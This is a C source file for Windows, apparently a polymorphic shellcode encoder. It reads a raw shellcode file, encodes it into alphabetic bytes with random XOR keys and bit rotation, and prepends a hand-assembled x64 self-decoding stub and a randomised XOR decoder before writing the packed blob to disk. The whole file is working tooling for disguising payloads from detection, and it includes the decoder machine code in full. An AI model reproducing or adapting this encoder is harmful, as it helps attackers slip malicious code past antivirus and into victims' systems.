#include <Windows.h>
#include <immintrin.h>      // _rdrand16_step
#include <stdio.h>

#include "PolyShellcodeGen.h"
#include "Utilities.h"

// ============================================================================================================================================================

#define ROTL8(x,n)  ((BYTE) ( ((UINT8)(x) << (n)) | ((UINT8)(x) >> (8 - (n))) ) & 0xFF)

// ============================================================================================================================================================

volatile	BYTE		g_bAlphabeticalXorKey		= 0x00;
volatile	BYTE		g_bTinyEncoderXorKey        = 0x00;     

// ============================================================================================================================================================

CONST	    BYTE		g_bRotValue					= 0x04;

// ============================================================================================================================================================

static BOOL XorEncrypt(IN PBYTE pBufferToEncode, IN DWORD dwBufferLength)
{

    if (!g_bTinyEncoderXorKey)
    {
        if (!GenRandomByte(&g_bTinyEncoderXorKey))
        {
            printf("[!] Failed To Generate XOR Key For The Tiny XOR Encoder\n");
            return FALSE;
		}
    }

	BYTE bXorKey = g_bTinyEncoderXorKey;

    for (DWORD i = 0; i < dwBufferLength; i++)
    {
        pBufferToEncode[i] ^= (BYTE)(bXorKey + i);
    }

	return TRUE;
}

// ============================================================================================================================================================


BOOL GenRandomByte(OUT PBYTE pRndValue)
{
    unsigned short usRndValue = 0x00;

    for (int i = 0; i < 0x0A; i++)
    {
        if (_rdrand16_step(&usRndValue))
        {
            *pRndValue = (BYTE)(usRndValue & 0xFF);
            return TRUE;
        }
        _mm_pause();
    }

    return FALSE;
}


static __inline BOOL IsAlphabetical(BYTE bChar)
{
    return ((bChar >= 'A' && bChar <= 'Z') || (bChar >= 'a' && bChar <= 'z'));
}


static BOOL GetAlphabeticalOffset(IN BYTE bPlainByte, OUT PBYTE pbOffset, OUT PBYTE pbTransformed)
{
    BYTE    bRndmStart  = 0x00;

    if (!GenRandomByte(&bRndmStart))
        return FALSE;

    bRndmStart %= 52;

    for (BYTE i = 0; i < 52; i++)
    {
        BYTE    bIndex             = (bRndmStart + i) % 52;
		BYTE    bBaseByte          = (bIndex < 26) ? 'A' : 'a';
        BYTE    bCandidateOff      = (BYTE)(bBaseByte + (bIndex % 26));
        BYTE    bTmpTransf         = ROTL8((bPlainByte + bCandidateOff), g_bRotValue) ^ g_bAlphabeticalXorKey;

        if (IsAlphabetical(bTmpTransf))
        {
            *pbOffset       = bCandidateOff;
            *pbTransformed  = bTmpTransf;
            return TRUE;
        }
    }

    *pbOffset       = (BYTE)((bRndmStart < 26 ? 'A' : 'a') + (bRndmStart % 26));
    *pbTransformed  = (BYTE)ROTL8((bPlainByte + *pbOffset), g_bRotValue) ^ g_bAlphabeticalXorKey;

    return TRUE;
}



// ============================================================================================================================================================


BOOL AlphabeticalShellcodeEncode(IN PBYTE pRawHexShellcode, IN DWORD dwRawHexShellcodeSize, OUT PBYTE* ppEncodedShellcode, OUT PDWORD pdwEncodedShellcodeSize) {

    DWORD       dwDwordCount            = 0x00,
		        dwRemainder             = 0x00,
                dwProcessedBytes        = 0x00;
	PWORD       pwEncodedBuffer         = NULL;


    if (!pRawHexShellcode || !dwRawHexShellcodeSize || !ppEncodedShellcode || !pdwEncodedShellcodeSize)
        return FALSE;

    if (dwRawHexShellcodeSize > (SIZE_MAX / sizeof(WORD)))
        return FALSE;


    if (!g_bAlphabeticalXorKey)
    {
        if (!GenRandomByte(&g_bAlphabeticalXorKey))
        {
            return FALSE;
        }
    }

    if (!(pwEncodedBuffer = (PWORD)LocalAlloc(LPTR, dwRawHexShellcodeSize * sizeof(WORD))))
    {
		printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        return FALSE;
    }

	*ppEncodedShellcode         = NULL;
	*pdwEncodedShellcodeSize    = dwRawHexShellcodeSize * sizeof(WORD);
    dwDwordCount                = dwRawHexShellcodeSize >> 0x02;

    for (DWORD i = 0; i < dwDwordCount; i++)
    {
        DWORD   dwValue     = *(PDWORD)(pRawHexShellcode + (i * 4));
        PBYTE   pBytes      = NULL;

        dwValue = ((dwValue << 0x10) | (dwValue >> 0x10)) & 0xFFFFFFFF;
		pBytes  = (PBYTE)&dwValue;

        for (DWORD x = 0; x < 0x04; x++) 
        {
            BYTE bOffset = 0x00, bTransformed = 0x00;
            
            if (!GetAlphabeticalOffset(pBytes[x], &bOffset, &bTransformed)) 
            {
				goto _END_OF_FUNC;
            }
            
            pwEncodedBuffer[dwProcessedBytes++] = (WORD)((bOffset << 0x08) | bTransformed);
        }
    }

    dwRemainder = dwRawHexShellcodeSize & 0x03;

    if (dwRemainder > 0) 
    {
        DWORD   dwValue     = 0x00;
        PBYTE   pBytes      = NULL;

        RtlCopyMemory(&dwValue, pRawHexShellcode + (dwDwordCount * 4), dwRemainder);

        if (dwRemainder >= 0x02) 
        {
            dwValue = ((dwValue << 0x10) | (dwValue >> 0x10)) & 0xFFFFFFFF;
        }

        pBytes = (PBYTE)&dwValue;
        

        for (DWORD x = 0; x < dwRemainder; x++)
        {
            BYTE bOffset = 0x00, bTransformed = 0x00;

            if (!GetAlphabeticalOffset(pBytes[x], &bOffset, &bTransformed)) 
            {
                goto _END_OF_FUNC;
            }

            pwEncodedBuffer[dwProcessedBytes++] = (WORD)((bOffset << 0x08) | bTransformed);
        }
    }

    *ppEncodedShellcode = (PBYTE)pwEncodedBuffer;
    
_END_OF_FUNC:
    if (!*ppEncodedShellcode)
    {
        if (pwEncodedBuffer)
        {
            LocalFree(pwEncodedBuffer);
			pwEncodedBuffer = NULL;
            *pdwEncodedShellcodeSize = 0x00;
        }
    }

	return (*ppEncodedShellcode && *pdwEncodedShellcodeSize) ? TRUE : FALSE;
}


// ============================================================================================================================================================


/*

//
// This is generated using the "GenerateRandomVariant" function
//
unsigned char g_TinyXorDecoderShellcode [ ] =
{
    0xEB, 0x16,                     // jmp      0x18
    0x5E,                           // pop      rsi
    0x56,                           // push     rsi
    0xB1, 0x86,                     // mov      cl, BUFFER_SIZE     (0x86)      -- this is the size of 'AlphabeticalDecoder'
    0x88, 0xC8,                     // mov      al, cl
    0xF6, 0xD8,                     // neg      al
    0x04, 0x35,                     // add      al, XOR_KEY         (0x35)      -- this is the 'g_bTinyEncoderXorKey' XOR key                     [DYNAMIC]
    0x04, 0x86,                     // add      al, BUFFER_SIZE     (0x86)      -- this is the size of 'AlphabeticalDecoder'
    0x30, 0x06,                     // xor      BYTE PTR [rsi], al
    0x48, 0xFF, 0xC6,               // inc      rsi
    0xE2, 0xF1,                     // loop     0x6
    0x5E,                           // pop      rsi
    0xFF, 0xE6,                     // jmp      rsi
    0xE8, 0xE5, 0xFF, 0xFF, 0xFF    // call     0x2
};

*/

unsigned char g_AlphabeticalDecoder[] =
{
    0x53,                           // push    rbx
    0x56,                           // push    rsi
    0x57,                           // push    rdi
    0x55,                           // push    rbp
    0x48, 0x89, 0xE5,               // mov     rbp, rsp
    0xE8, 0x00, 0x00, 0x00, 0x00,   // call    0xc 
    0x5E,                           // pop     rsi 
    0x48, 0x83, 0xC6, 0x7A,         // add     rsi, 0x7A        
	0xBB, 0x28, 0x02, 0x00, 0x00,   // mov     ebx, BUFFER_SIZE     (0x228)     -- this is the size of Alphabetical Encoded Shellcode             [DYNAMIC]
    0x89, 0xDF,                     // mov     edi, ebx
    0xD1, 0xEF,                     // shr     edi, 1 
    0x31, 0xC9,                     // xor     ecx, ecx 
    0x39, 0xF9,                     // cmp     ecx, edi
    0x73, 0x20,                     // jae     0x40 
    0x0F, 0xB7, 0x04, 0x4E,         // movzx   eax, WORD PTR [rsi+rcx*2]
    0x41, 0x88, 0xC0,               // mov     r8b, al 
    0xC1, 0xE8, 0x08,               // shr     eax, 0x8 
    0x41, 0x88, 0xC1,               // mov     r9b, al 
	0x41, 0x80, 0xF0, 0xAB,         // xor     r8b, XOR_KEY         (0xAB)      -- this is the 'g_bAlphabeticalXorKey' XOR key                    [DYNAMIC]
	0x41, 0xC0, 0xC8, 0x04,         // ror     r8b, 0x4             (0x04)      -- this is the 'g_bRotValue' rotation value                       [DYNAMIC]  
    0x45, 0x28, 0xC8,               // sub     r8b, r9b
    0x44, 0x88, 0x04, 0x0E,         // mov     BYTE PTR [rsi+rcx*1], r8b
    0xFF, 0xC1,                     // inc     ecx
    0xEB, 0xDC,                     // jmp     0x1c
    0x89, 0xF8,                     // mov     eax, edi
    0x83, 0xE0, 0xFC,               // and     eax, 0xfffffffc 
    0xC1, 0xE8, 0x02,               // shr     eax, 0x2 
    0x31, 0xC9,                     // xor     ecx, ecx 
    0x39, 0xC1,                     // cmp     ecx, eax
    0x73, 0x0D,                     // jae     0x5b 
    0x8B, 0x14, 0x8E,               // mov     edx, DWORD PTR [rsi+rcx*4]
    0xC1, 0xC2, 0x10,               // rol     edx, 0x10 
    0x89, 0x14, 0x8E,               // mov     DWORD PTR [rsi+rcx*4], edx
    0xFF, 0xC1,                     // inc     ecx
    0xEB, 0xEF,                     // jmp     0x4a 
    0x57,                           // push    rdi
    0x56,                           // push    rsi
    0x48, 0x89, 0xF0,               // mov     rax, rsi
    0x48, 0x01, 0xF8,               // add     rax, rdi
    0x48, 0x89, 0xF9,               // mov     rcx, rdi
    0x48, 0x31, 0xD2,               // xor     rdx, rdx 
    0x48, 0x85, 0xC9,               // test    rcx, rcx
    0x74, 0x0A,                     // je      0x78 
    0x88, 0x10,                     // mov     BYTE PTR [rax], dl
    0x48, 0xFF, 0xC0,               // inc     rax
    0x48, 0xFF, 0xC9,               // dec     rcx
    0xEB, 0xF1,                     // jmp     0x69
    0x5E,                           // pop     rsi
    0x5F,                           // pop     rdi
    0x48, 0x89, 0xEC,               // mov     rsp, rbp
    0x5D,                           // pop     rbp
    0x5F,                           // pop     rdi
    0x48, 0x89, 0xF0,               // mov     rax, rsi
    0x5E,                           // pop     rsi
    0x5B,                           // pop     rbx
    0xFF, 0xE0                      // jmp     rax 
};

// ============================================================================================================================================================
// ============================================================================================================================================================


int wmain() 
{
    PWCHAR      pwszInputFile                           = NULL;
    PWCHAR      pwszOutputFile                          = NULL;
    PBYTE       pPlainTextShellcode                     = NULL,
                pAlphabeticalEncodedShellcode           = NULL,
                pTotalEncodedShellcode                  = NULL;
    BYTE        TinyXorDecoderShellcode[0x100]          = { 0 };
    DWORD       dwPlainTextShellcodeLen                 = 0x00,
                dwAlphabeticalEncodedShellcodeLen       = 0x00,
                dwTinyXorDecoderShellcodeLen            = 0x00,
                dwTotalEncodedShellcodeLen              = 0x00;


    if (!ParseAndValidateCommandLine(&pwszInputFile, &pwszOutputFile))
        return -1;

    if (!ReadFileFromDiskW(pwszInputFile, &pPlainTextShellcode, &dwPlainTextShellcodeLen))
    {
        goto _END_OF_FUNC;
	}


    if (!AlphabeticalShellcodeEncode(pPlainTextShellcode, dwPlainTextShellcodeLen, &pAlphabeticalEncodedShellcode, &dwAlphabeticalEncodedShellcodeLen))
    {
        goto _END_OF_FUNC;
    }


    // Patch g_AlphabeticalDecoder with the size of the alphabetical encoded shellcode
    memcpy(&g_AlphabeticalDecoder[18], &dwAlphabeticalEncodedShellcodeLen, sizeof(DWORD));

	// Patch g_AlphabeticalDecoder with the XOR key 
	memcpy(&g_AlphabeticalDecoder[48], &g_bAlphabeticalXorKey, sizeof(BYTE));

	// Patch g_AlphabeticalDecoder with the rotation value
	memcpy(&g_AlphabeticalDecoder[52], &g_bRotValue, sizeof(BYTE));

	printf("[i] Configured The AlphabeticalDecoder Shellcode:\n");
	printf("\t[>] Alphabetical Encoded Shellcode Length: %d Bytes\n", dwAlphabeticalEncodedShellcodeLen);
	printf("\t[>] Alphabetical XOR Key: 0x%02X\n", g_bAlphabeticalXorKey);
	printf("\t[>] Alphabetical Rotation Value: 0x%02X\n", g_bRotValue);

	if (!XorEncrypt(g_AlphabeticalDecoder, sizeof(g_AlphabeticalDecoder)))
    {
        printf("[!] Failed To XOR Encrypt The AlphabeticalDecoder Shellcode\n");
        goto _END_OF_FUNC;
	}

    if (!GenerateRandomVariant(TinyXorDecoderShellcode, &dwTinyXorDecoderShellcodeLen, g_bTinyEncoderXorKey))
    {
        printf("[!] Failed To Generate The XOR Shellcode Decoder\n");
        goto _END_OF_FUNC;
	}

    printf("[i] Configured The TinyXorDecoder Shellcode:\n");
    printf("\t[>] Tiny XOR Encoder Key: 0x%02X\n", g_bTinyEncoderXorKey);
	printf("\t[i] Tiny XOR Decoder Shellcode Length: %d\n", dwTinyXorDecoderShellcodeLen);

	dwTotalEncodedShellcodeLen  = dwTinyXorDecoderShellcodeLen + sizeof(g_AlphabeticalDecoder) + dwAlphabeticalEncodedShellcodeLen;
	pTotalEncodedShellcode      = (PBYTE)LocalAlloc(LPTR, dwTotalEncodedShellcodeLen);

    if (!pTotalEncodedShellcode)
    {
        printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        LocalFree(pAlphabeticalEncodedShellcode);
        return -1;
	}

	// Copy the TinyXorDecoderShellcode 
	memcpy(pTotalEncodedShellcode, TinyXorDecoderShellcode, dwTinyXorDecoderShellcodeLen);
	
    // Copy the g_AlphabeticalDecoder
    memcpy(pTotalEncodedShellcode + dwTinyXorDecoderShellcodeLen, g_AlphabeticalDecoder, sizeof(g_AlphabeticalDecoder));
	
    // Copy the Alphabetical Encoded Shellcode
    memcpy(pTotalEncodedShellcode + dwTinyXorDecoderShellcodeLen + sizeof(g_AlphabeticalDecoder), pAlphabeticalEncodedShellcode, dwAlphabeticalEncodedShellcodeLen);

    HexDump(L"TinyXorDecoderShellcode", (PBYTE)TinyXorDecoderShellcode, dwTinyXorDecoderShellcodeLen);
    printf("\n\n");

    HexDump(L"AlphabeticalDecoder", (PBYTE)g_AlphabeticalDecoder, sizeof(g_AlphabeticalDecoder));
    printf("\n\n");


    if (!WriteFileToDiskW(pwszOutputFile, pTotalEncodedShellcode, dwTotalEncodedShellcodeLen))
    {
        goto _END_OF_FUNC;
    }

	printf("[i] Successfully Wrote The Encoded Shellcode To Disk: %ws\n", pwszOutputFile);

    /*
    HexDump1(L"TotalShellcode", (PBYTE)pTotalEncodedShellcode, dwTotalEncodedShellcodeLen);
    printf("\n\n");
    */


_END_OF_FUNC:
    if (pwszOutputFile)
        LocalFree(pwszOutputFile);
    if (pwszInputFile)
        LocalFree(pwszInputFile);
    if (pAlphabeticalEncodedShellcode)
        LocalFree(pAlphabeticalEncodedShellcode);
    if (pTotalEncodedShellcode)
        LocalFree(pTotalEncodedShellcode);
    return 0;

}

